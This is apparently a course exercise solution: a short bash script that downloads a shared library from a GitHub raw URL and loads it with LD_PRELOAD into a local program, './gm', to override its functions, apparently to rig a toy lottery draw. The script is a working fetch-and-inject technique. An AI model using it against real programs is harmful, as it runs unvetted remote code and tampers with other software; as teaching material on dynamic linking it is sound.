#!/bin/bash
wget -P /inject/ https://raw.githubusercontent.com/mohamedahmed-cloud/alx-low_level_programming/main/0x18-dynamic_libraries/libtest.so
LD_PRELOAD="/inject/libtest.so" ./gm 9 8 10 24 75 9